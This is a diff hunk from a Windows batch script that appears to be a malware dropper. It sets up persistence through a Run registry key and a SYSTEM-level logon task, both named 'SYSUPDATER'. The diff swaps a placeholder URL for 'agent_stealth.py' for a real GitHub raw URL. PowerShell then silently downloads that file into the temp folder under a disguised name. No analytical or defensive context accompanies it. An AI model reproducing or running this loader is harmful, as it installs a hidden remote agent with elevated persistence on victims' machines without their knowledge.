@@ -29,7 +29,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SYSUPDATER" /t 
 schtasks /create /tn "SYSUPDATER" /tr "\"%~f0\"" /sc onlogon /f /ru "SYSTEM" /rl HIGHEST 2>nul
 
 :: Download agent from GitHub
-set "GITHUB_URL=https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/agent_stealth.py"
+set "GITHUB_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
 set "AGENT_FILE=%temp%\sysupdater_%random%.py"
 
 powershell -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%AGENT_FILE%' -UseBasicParsing" 2>nul
